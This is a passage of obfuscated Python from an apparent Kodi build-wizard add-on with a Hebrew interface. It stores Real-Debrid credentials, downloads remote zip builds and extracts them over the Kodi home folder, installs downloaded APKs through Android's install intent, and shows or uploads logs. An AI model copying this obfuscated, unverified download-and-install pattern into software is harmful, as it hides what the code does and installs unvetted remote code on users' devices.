    O0O0OOO000O0O0O0O .setSetting ('rd_user',OO0OO0O0OOOOO000O )#line:3351
    O0O0OOO000O0O0O0O .setSetting ('rd_pass',O0O0OOOO0OOOO0OOO )#line:3352
    if not OO0OO0O0OOOOO000O =='':#line:3354
        O0O0O00OO00OOO00O =[]#line:3356
        O0O0O00OO00OOO00O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מגדיר חשבון RD[/COLOR]'%COLOR2 ))#line:3357
        O0O0O00OO00OOO00O [0 ].start ()#line:3359
        from resources .libs import real_debrid #line:3360
        O0OOO0O00OOO0000O =real_debrid .RealDebrid ()#line:3361
        O0OOO0O00OOO0000O .auth ()#line:3362
def buildWizard (O000OOOO0O000OO0O ,OOOO00OOO0O000O0O ,theme =None ,over =False ):#line:3363
    xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:3365
    if USERNAME =='':#line:3367
        ADDON .openSettings ()#line:3368
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3369
        sys .exit ()#line:3370
    if PASSWORD =='':#line:3371
        ADDON .openSettings ()#line:3372
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3373
        sys .exit ()#line:3374
    if OOOO00OOO0O000O0O =='gui':#line:3376
        O0O00OOO00O00O00O =wiz .checkBuild (O000OOOO0O000OO0O ,'gui')#line:3381
        OO0000OOO00O00OO0 =O000OOOO0O000OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3382
        if not wiz .workingURL (O0O00OOO00O00O00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]עדכון המערכת אינו זמין כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 );return #line:3383
        if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3384
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOO0O000OO0O )+'\n'+''+'\n'+'אנא המתן')#line:3385
        OOO0OO000000OO00O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0000OOO00O00OO0 )#line:3386
        OOOOO00OOO0000OOO ='עדכון מערכת'#line:3389
        if 'google'in O0O00OOO00O00O00O :#line:3390
           googledrive_download (O0O00OOO00O00O00O ,OOO0OO000000OO00O ,DP ,wiz .checkBuild (O000OOOO0O000OO0O ,'updatesize'))#line:3391
        else :#line:3392
          downloader .download (O0O00OOO00O00O00O ,OOO0OO000000OO00O ,DP )#line:3393
        xbmc .sleep (100 )#line:3394
        OOOOO0000O0O000OO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOO00OOO0000OOO )#line:3395
        DP .update (0 ,OOOOO0000O0O000OO +'\n'+''+'\n'+'אנא המתן')#line:3396
        extract .all (OOO0OO000000OO00O ,HOME ,DP ,title =OOOOO0000O0O000OO )#line:3397
        DP .close ()#line:3398
        try :os .remove (OOO0OO000000OO00O )#line:3401
        except :pass #line:3402
        wiz .kodi17Fix ()#line:3403
        if INSTALLMETHOD ==1 :OOOO0OO0OO0O0O0OO =1 #line:3409
        elif INSTALLMETHOD ==2 :OOOO0OO0OO0O0O0OO =0 #line:3410
        else :DP .close ()#line:3411
        xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3417
        OOO00O0O00O0OOO0O =[]#line:3418
        OOO00O0O00O0OOO0O .append (Thread (indicatorfastupdate ))#line:3419
        OOO00O0O00O0OOO0O [0 ].start ()#line:3421
        if wiz .getS ("dragon")=='true':#line:3422
          try :#line:3423
              open_dragon_menu_hub ()#line:3424
          except Exception as OO0OOOO0O00O00OOO :#line:3425
             logging .warning ('dragon hub errrrrrrror'+str (OO0OOOO0O00O00OOO ))#line:3426
        else :#line:3427
          try :#line:3428
              close_dragon_menu_hub ()#line:3429
          except Exception as OO0OOOO0O00O00OOO :#line:3430
             logging .warning ('dragon hub errrrrrrror'+str (OO0OOOO0O00O00OOO ))#line:3431
        if wiz .getS ('sex')=='false':#line:3432
            sex_menu_luck (notify ='false')#line:3433
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]המערכת עודכנה בהצלחה![/COLOR]'%COLOR2 )#line:3434
    elif OOOO00OOO0O000O0O =='fresh':#line:3440
            if not BUILDNAME =='':#line:3445
                O00OO000O0OO0OO0O =xbmcgui .Dialog ()#line:3446
                OO0OO0OOO000O00OO =O00OO000O0OO0OO0O .yesno (ADDONTITLE ,"[COLOR %s]הבילד כבר מותקן, [COLOR %s]%s[/COLOR]האם תרצה להתקין אותו שוב?[/COLOR]"%(COLOR2 ,COLOR1 ,''),yeslabel ="[B]כן[/B]",nolabel ="[B]לא[/B]")#line:3447
                if OO0OO0OOO000O00OO ==0 :#line:3449
                    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3450
                    sys .exit ()#line:3451
            check ()#line:3453
            wiz .STARTP ()#line:3454
            OOO00O0O00O0OOO0O =[]#line:3456
            OOO00O0O00O0OOO0O .append (Thread (start_install ,'מבקש אישור להתקין - '))#line:3457
            OOO00O0O00O0OOO0O [0 ].start ()#line:3459
            O0O00OOO00O00O00O =ld (get_link (code_link ))#line:3466
            OOO00O0O00O0OOO0O =[]#line:3468
            OOO00O0O00O0OOO0O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה מתחילה, אנא המתן...[/COLOR]'%COLOR2 ))#line:3469
            OOO00O0O00O0OOO0O [0 ].start ()#line:3471
            OOO00O0O00O0OOO0O =[]#line:3473
            OOO00O0O00O0OOO0O .append (Thread (start_install ,'ההתקנה אושרה '))#line:3474
            OOO00O0O00O0OOO0O [0 ].start ()#line:3476
            freshStart (O000OOOO0O000OO0O )#line:3481
            OO0000OOO00O00OO0 =O000OOOO0O000OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3486
            if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3488
            DP .create (ADDONTITLE ,'[B]Downloading:[/B][COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOO0O000OO0O ,wiz .checkBuild (O000OOOO0O000OO0O ,'version'))+'\n'+''+'\n'+'Please Wait')#line:3489
            OOO0OO000000OO00O =os .path .join (PACKAGES ,'%s.zip'%OO0000OOO00O00OO0 )#line:3491
            try :os .remove (OOO0OO000000OO00O )#line:3493
            except :pass #line:3494
            if 'google'in O0O00OOO00O00O00O :#line:3497
                googledrive_download (O0O00OOO00O00O00O ,OOO0OO000000OO00O ,DP ,wiz .checkBuild (O000OOOO0O000OO0O ,'filesize'))#line:3498
            else :#line:3500
                downloader .download (O0O00OOO00O00O00O ,OOO0OO000000OO00O ,DP )#line:3501
            OOOOO0000O0O000OO ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOO0O000OO0O ,wiz .checkBuild (O000OOOO0O000OO0O ,'version'))#line:3502
            DP .update (0 ,OOOOO0000O0O000OO +'\n'+''+'\n'+'אנא המתן...')#line:3504
            if DP .iscanceled ():#line:3505
             DP .close ()#line:3506
            O00OO0000OO000OOO ,OO00OO0O0OO0O0OO0 ,OOOO0OO0OOOO0O00O =extract .all (OOO0OO000000OO00O ,HOME ,DP ,title =OOOOO0000O0O000OO )#line:3507
            if int (float (O00OO0000OO000OOO ))>0 :#line:3508
                fastupdatefirstbuild (NOTEID )#line:3510
                wiz .setS ('buildname',O000OOOO0O000OO0O )#line:3511
                wiz .setS ('buildversion',wiz .checkBuild (O000OOOO0O000OO0O ,'version'))#line:3512
                wiz .setS ('buildtheme','')#line:3513
                wiz .setS ('latestversion',wiz .checkBuild (O000OOOO0O000OO0O ,'version'))#line:3514
                wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:3515
                wiz .setS ('installed','true')#line:3516
                skin_homeselect ()#line:3518
                if wiz .getS ("dragon")=='true':#line:3522
                  install_turkey ()#line:3523
                wiz .kodi17Fix ()#line:3525
                fix_gui ()#line:3527
                try :#line:3528
                    tdlib ()#line:3529
                except :pass #line:3530
                OOO00O0O00O0OOO0O =[]#line:3531
                if len (wiz .getS ("sync_user"))>0 :#line:3532
                    OOO00O0O00O0OOO0O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מסנכרן את החשבון שלך[/COLOR]'%COLOR2 ))#line:3533
                    OOO00O0O00O0OOO0O [0 ].start ()#line:3534
                    xbmc .sleep (3000 )#line:3535
                    from resources .libs import sync #line:3537
                if len (wiz .getS ("rd_user"))>0 :#line:3539
                    sync_rd ()#line:3540
                try :os .remove (OOO0OO000000OO00O )#line:3544
                except :pass #line:3545
                DP .close ()#line:3548
                OO0OO0O0O0OO000O0 =platform .uname ()#line:3549
                OOOO0OOOOOO000OO0 =OO0OO0O0O0OO000O0 [1 ]#line:3550
                wiz .setS ("platform_name",OOOO0OOOOOO000OO0 )#line:3551
                backup_setting_file ()#line:3552
                OOO00O0O00O0OOO0O =[]#line:3553
                OOO00O0O00O0OOO0O .append (Thread (indicator ))#line:3554
                OOO00O0O00O0OOO0O [0 ].start ()#line:3555
                OOO00O0O00O0OOO0O =[]#line:3556
                OOO00O0O00O0OOO0O .append (Thread (wiz .LogNotify ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה הסתיימה.[/COLOR]'%COLOR2 ))#line:3557
                OOO00O0O00O0OOO0O [0 ].start ()#line:3558
                resetkodi ()#line:3559
            else :#line:3560
                xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:3561
                OOO00O0O00O0OOO0O =[]#line:3562
                OOO00O0O00O0OOO0O .append (Thread (gomsb ))#line:3563
                OOO00O0O00O0OOO0O [0 ].start ()#line:3564
                DP .close ()#line:3565
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ההתקנה אינה זמינה כעת, נסו שוב מאוחר יותר.[/COLOR]'%COLOR2 )#line:3566
                sys .exit ()#line:3567
def testTheme (O000000000OOO0O00 ):#line:3571
	OO0O0O00O00O0000O =zipfile .ZipFile (O000000000OOO0O00 )#line:3572
	for O00OO00OOOOO0000O in OO0O0O00O00O0000O .infolist ():#line:3573
		if '/settings.xml'in O00OO00OOOOO0000O .filename :#line:3574
			return True #line:3575
	return False #line:3576
def testGui (O00O00O0O000O00O0 ):#line:3578
	OO0OOO0OOO0OO0OO0 =zipfile .ZipFile (O00O00O0O000O00O0 )#line:3579
	for OO0OO000000OO000O in OO0OOO0OOO0OO0OO0 .infolist ():#line:3580
		if '/guisettings.xml'in OO0OO000000OO000O .filename :#line:3581
			return True #line:3582
	return False #line:3583
def apkInstaller (O0000OO0O0O000O00 ,O00O0OO00000OO00O ):#line:3585
	wiz .log (O0000OO0O0O000O00 )#line:3586
	wiz .log (O00O0OO00000OO00O )#line:3587
	if wiz .platform_d ()=='android':#line:3588
		O0O0O000O00O0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0000OO0O0O000O00 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3589
		if not O0O0O000O00O0OO0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:3590
		OO0O0O0O00O000O0O =O0000OO0O0O000O00 #line:3591
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3592
		if not wiz .workingURL (O00O0OO00000OO00O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:3593
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0O0O00O000O0O ),'','אנא המתן')#line:3594
		OOOO0OO0O00O0O000 =os .path .join (PACKAGES ,"%s.apk"%O0000OO0O0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:3595
		try :os .remove (OOOO0OO0O00O0O000 )#line:3596
		except :pass #line:3597
		downloader .download (O00O0OO00000OO00O ,OOOO0OO0O00O0O000 ,DP )#line:3598
		xbmc .sleep (100 )#line:3599
		DP .close ()#line:3600
		notify .apkInstaller (O0000OO0O0O000O00 )#line:3601
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOOO0OO0O00O0O000 +'")')#line:3602
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:3603
def createMenu (O0O0O0O00O0OOOO0O ,OOO000OO0OO00O000 ,OOOO000OOOOOOOO0O ):#line:3609
	if O0O0O0O00O0OOOO0O =='saveaddon':#line:3610
		OOOO0OO0O00O0000O =[]#line:3611
		O0OO00OO0O0000O0O =que (OOO000OO0OO00O000 .lower ().replace (' ',''))#line:3612
		OOOO0O000O000O000 =OOO000OO0OO00O000 .replace ('Debrid','Real Debrid')#line:3613
		OO0OOOOO00O0O0000 =que (OOOO000OOOOOOOO0O .lower ().replace (' ',''))#line:3614
		OOOO000OOOOOOOO0O =OOOO000OOOOOOOO0O .replace ('url','URL Resolver')#line:3615
		OOOO0OO0O00O0000O .append ((THEME2 %OOOO000OOOOOOOO0O .title (),' '))#line:3616
		OOOO0OO0O00O0000O .append ((THEME3 %'Save %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3617
		OOOO0OO0O00O0000O .append ((THEME3 %'Restore %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3618
		OOOO0OO0O00O0000O .append ((THEME3 %'Clear %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3619
	elif O0O0O0O00O0OOOO0O =='save':#line:3620
		OOOO0OO0O00O0000O =[]#line:3621
		O0OO00OO0O0000O0O =que (OOO000OO0OO00O000 .lower ().replace (' ',''))#line:3622
		OOOO0O000O000O000 =OOO000OO0OO00O000 .replace ('Debrid','Real Debrid')#line:3623
		OO0OOOOO00O0O0000 =que (OOOO000OOOOOOOO0O .lower ().replace (' ',''))#line:3624
		OOOO000OOOOOOOO0O =OOOO000OOOOOOOO0O .replace ('url','URL Resolver')#line:3625
		OOOO0OO0O00O0000O .append ((THEME2 %OOOO000OOOOOOOO0O .title (),' '))#line:3626
		OOOO0OO0O00O0000O .append ((THEME3 %'Register %s'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3627
		OOOO0OO0O00O0000O .append ((THEME3 %'Save %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3628
		OOOO0OO0O00O0000O .append ((THEME3 %'Restore %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3629
		OOOO0OO0O00O0000O .append ((THEME3 %'Import %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3630
		OOOO0OO0O00O0000O .append ((THEME3 %'Clear Addon %s Data'%OOOO0O000O000O000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0OO00OO0O0000O0O ,OO0OOOOO00O0O0000 )))#line:3631
	elif O0O0O0O00O0OOOO0O =='install':#line:3632
		OOOO0OO0O00O0000O =[]#line:3633
		OO0OOOOO00O0O0000 =que (OOOO000OOOOOOOO0O )#line:3634
		OOOO0OO0O00O0000O .append ((THEME2 %OOOO000OOOOOOOO0O ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0OOOOO00O0O0000 )))#line:3635
		OOOO0OO0O00O0000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0OOOOO00O0O0000 )))#line:3636
		OOOO0OO0O00O0000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0OOOOO00O0O0000 )))#line:3637
		OOOO0OO0O00O0000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0OOOOO00O0O0000 )))#line:3638
		OOOO0OO0O00O0000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0OOOOO00O0O0000 )))#line:3639
	OOOO0OO0O00O0000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:3640
	return OOOO0OO0O00O0000O #line:3641
def toggleCache (O0O0O0000O00O0OOO ):#line:3643
	OO0O00O000OOO0OO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:3644
	O0OOO00O000OO0O00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:3645
	if O0O0O0000O00O0OOO in ['true','false']:#line:3646
		for OO00OOO0O0O00O0O0 in OO0O00O000OOO0OO0 :#line:3647
			wiz .setS (OO00OOO0O0O00O0O0 ,O0O0O0000O00O0OOO )#line:3648
	else :#line:3649
		if not O0O0O0000O00O0OOO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:3650
			try :#line:3651
				OO00OOO0O0O00O0O0 =O0OOO00O000OO0O00 [OO0O00O000OOO0OO0 .index (O0O0O0000O00O0OOO )]#line:3652
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO00OOO0O0O00O0O0 ))#line:3653
			except :#line:3654
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O0O0O0000O00O0OOO ))#line:3655
		else :#line:3656
			OOOOOOOOO0O0OO0O0 ='true'if wiz .getS (O0O0O0000O00O0OOO )=='false'else 'false'#line:3657
			wiz .setS (O0O0O0000O00O0OOO ,OOOOOOOOO0O0OO0O0 )#line:3658
def playVideo (OO000OO0O0000O0OO ):#line:3660
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO000OO0O0000O0OO )#line:3661
	if 'watch?v='in OO000OO0O0000O0OO :#line:3662
		OOOOOOO00000OOO00 ,OOO0OO00OO0O0O0OO =OO000OO0O0000O0OO .split ('?')#line:3663
		O0O000OO0O0O00OOO =OOO0OO00OO0O0O0OO .split ('&')#line:3664
		for OOO0O0O00O000O000 in O0O000OO0O0O00OOO :#line:3665
			if OOO0O0O00O000O000 .startswith ('v='):#line:3666
				OO000OO0O0000O0OO =OOO0O0O00O000O000 [2 :]#line:3667
				break #line:3668
			else :continue #line:3669
	elif 'embed'in OO000OO0O0000O0OO or 'youtu.be'in OO000OO0O0000O0OO :#line:3670
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO000OO0O0000O0OO )#line:3671
		OOOOOOO00000OOO00 =OO000OO0O0000O0OO .split ('/')#line:3672
		if len (OOOOOOO00000OOO00 [-1 ])>5 :#line:3673
			OO000OO0O0000O0OO =OOOOOOO00000OOO00 [-1 ]#line:3674
		elif len (OOOOOOO00000OOO00 [-2 ])>5 :#line:3675
			OO000OO0O0000O0OO =OOOOOOO00000OOO00 [-2 ]#line:3676
	wiz .log ("YouTube URL: %s"%OO000OO0O0000O0OO )#line:3677
	yt .PlayVideo (OO000OO0O0000O0OO )#line:3678
def viewLogFile ():#line:3680
	OO00O00OO0O000O00 =wiz .Grab_Log (True )#line:3681
	OOO00O0OOOOO0O0OO =wiz .Grab_Log (True ,True )#line:3682
	OOO00O000OOOO0OOO =0 ;OOO0OO0000000OO00 =OO00O00OO0O000O00 #line:3683
	if not OOO00O0OOOOO0O0OO ==False and not OO00O00OO0O000O00 ==False :#line:3684
		OOO00O000OOOO0OOO =DIALOG .select (ADDONTITLE ,["View %s"%OO00O00OO0O000O00 .replace (LOG ,""),"View %s"%OOO00O0OOOOO0O0OO .replace (LOG ,"")])#line:3685
		if OOO00O000OOOO0OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:3686
	elif OO00O00OO0O000O00 ==False and OOO00O0OOOOO0O0OO ==False :#line:3687
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:3688
		return #line:3689
	elif not OO00O00OO0O000O00 ==False :OOO00O000OOOO0OOO =0 #line:3690
	elif not OOO00O0OOOOO0O0OO ==False :OOO00O000OOOO0OOO =1 #line:3691
	OOO0OO0000000OO00 =OO00O00OO0O000O00 if OOO00O000OOOO0OOO ==0 else OOO00O0OOOOO0O0OO #line:3693
	OO000O0OOO0OOOO0O =wiz .Grab_Log (False )if OOO00O000OOOO0OOO ==0 else wiz .Grab_Log (False ,True )#line:3694
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OOO0OO0000000OO00 ),OO000O0OOO0OOOO0O )#line:3696
def errorChecking (log =None ,count =None ,all =None ):#line:3698
	if log ==None :#line:3699
		O00OOOO00OO0OOO00 =wiz .Grab_Log (True )#line:3700
		OO00O00O0O00000O0 =wiz .Grab_Log (True ,True )#line:3701
		if not OO00O00O0O00000O0 ==False and not O00OOOO00OO0OOO00 ==False :#line:3702
			O00000OOOO0O00O0O =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(O00OOOO00OO0OOO00 .replace (LOG ,""),errorChecking (O00OOOO00OO0OOO00 ,True ,True )),"View %s: %s error(s)"%(OO00O00O0O00000O0 .replace (LOG ,""),errorChecking (OO00O00O0O00000O0 ,True ,True ))])#line:3703
			if O00000OOOO0O00O0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:3704
		elif O00OOOO00OO0OOO00 ==False and OO00O00O0O00000O0 ==False :#line:3705
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:3706
			return #line:3707
		elif not O00OOOO00OO0OOO00 ==False :O00000OOOO0O00O0O =0 #line:3708
		elif not OO00O00O0O00000O0 ==False :O00000OOOO0O00O0O =1 #line:3709
		log =O00OOOO00OO0OOO00 if O00000OOOO0O00O0O ==0 else OO00O00O0O00000O0 #line:3710
	if log ==False :#line:3711
		if count ==None :#line:3712
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:3713
			return False #line:3714
		else :#line:3715
			return 0 #line:3716
	else :#line:3717
		if os .path .exists (log ):#line:3718
			OOOOOOOOO0000O000 =open (log ,mode ='r');O0O0O00O0O0OOOOO0 =OOOOOOOOO0000O000 .read ().replace ('\n','').replace ('\r','');OOOOOOOOO0000O000 .close ()#line:3719
			OO0OO000OOO00OO00 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0O0O00O0O0OOOOO0 )#line:3720
			if not count ==None :#line:3721
				if all ==None :#line:3722
					O000O00OO000OOO00 =0 #line:3723
					for O00OOO0O0O000OOO0 in OO0OO000OOO00OO00 :#line:3724
						if ADDON_ID in O00OOO0O0O000OOO0 :O000O00OO000OOO00 +=1 #line:3725
					return O000O00OO000OOO00 #line:3726
				else :return len (OO0OO000OOO00OO00 )#line:3727
			if len (OO0OO000OOO00OO00 )>0 :#line:3728
				O000O00OO000OOO00 =0 ;OO000000000O000O0 =""#line:3729
				for O00OOO0O0O000OOO0 in OO0OO000OOO00OO00 :#line:3730
					if all ==None and not ADDON_ID in O00OOO0O0O000OOO0 :continue #line:3731
					else :#line:3732
						O000O00OO000OOO00 +=1 #line:3733
						OO000000000O000O0 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(O000O00OO000OOO00 ,O00OOO0O0O000OOO0 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:3734
				if O000O00OO000OOO00 >0 :#line:3735
					wiz .TextBox (ADDONTITLE ,OO000000000O000O0 )#line:3736
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:3737
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:3738
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:3739
ACTION_PREVIOUS_MENU =10 #line:3741
ACTION_NAV_BACK =92 #line:3742
ACTION_MOVE_LEFT =1 #line:3743
ACTION_MOVE_RIGHT =2 #line:3744
ACTION_MOVE_UP =3 #line:3745
ACTION_MOVE_DOWN =4 #line:3746
ACTION_MOUSE_WHEEL_UP =104 #line:3747
ACTION_MOUSE_WHEEL_DOWN =105 #line:3748
ACTION_MOVE_MOUSE =107 #line:3749
ACTION_SELECT_ITEM =7 #line:3750
ACTION_BACKSPACE =110 #line:3751
ACTION_MOUSE_LEFT_CLICK =100 #line:3752
ACTION_MOUSE_LONG_CLICK =108 #line:3753
def LogViewer (default =None ):#line:3755
	class OOOOO0O000OO0OOOO (xbmcgui .WindowXMLDialog ):#line:3756
		def __init__ (O000O0O0O0OOOOO00 ,*OOOOO000OO0OOOO0O ,**O0O0O0000O0OOO0OO ):#line:3757
			O000O0O0O0OOOOO00 .default =O0O0O0000O0OOO0OO ['default']#line:3758
		def onInit (O0O000O00OOOOO0OO ):#line:3760
			O0O000O00OOOOO0OO .title =101 #line:3761
			O0O000O00OOOOO0OO .msg =102 #line:3762
			O0O000O00OOOOO0OO .scrollbar =103 #line:3763
			O0O000O00OOOOO0OO .upload =201 #line:3764
			O0O000O00OOOOO0OO .kodi =202 #line:3765
			O0O000O00OOOOO0OO .kodiold =203 #line:3766
			O0O000O00OOOOO0OO .wizard =204 #line:3767
			O0O000O00OOOOO0OO .okbutton =205 #line:3768
			OOOOOOOOO00O000O0 =open (O0O000O00OOOOO0OO .default ,'r')#line:3769
			O0O000O00OOOOO0OO .logmsg =OOOOOOOOO00O000O0 .read ()#line:3770
			OOOOOOOOO00O000O0 .close ()#line:3771
			O0O000O00OOOOO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O000O00OOOOO0OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:3772
			O0O000O00OOOOO0OO .showdialog ()#line:3773
		def showdialog (O00000O00O00O00O0 ):#line:3775
			O00000O00O00O00O0 .getControl (O00000O00O00O00O0 .title ).setLabel (O00000O00O00O00O0 .titlemsg )#line:3776
			O00000O00O00O00O0 .getControl (O00000O00O00O00O0 .msg ).setText (wiz .highlightText (O00000O00O00O00O0 .logmsg ))#line:3777
			O00000O00O00O00O0 .setFocusId (O00000O00O00O00O0 .scrollbar )#line:3778
		def onClick (OOO0O00O0000O0OOO ,OO000O00O0OO0OOOO ):#line:3780
			if OO000O00O0OO0OOOO ==OOO0O00O0000O0OOO .okbutton :OOO0O00O0000O0OOO .close ()#line:3781
			elif OO000O00O0OO0OOOO ==OOO0O00O0000O0OOO .upload :OOO0O00O0000O0OOO .close ();uploadLog .Main ()#line:3782
			elif OO000O00O0OO0OOOO ==OOO0O00O0000O0OOO .kodi :#line:3783
				OO00O0OOOOOOO0O00 =wiz .Grab_Log (False )#line:3784
				O0O0OOOO0O00OO0O0 =wiz .Grab_Log (True )#line:3785
				if OO00O0OOOOOOO0O00 ==False :#line:3786
					OOO0O00O0000O0OOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:3787
					OOO0O00O0000O0OOO .getControl (OOO0O00O0000O0OOO .msg ).setText ("Log File Does Not Exists!")#line:3788
				else :#line:3789
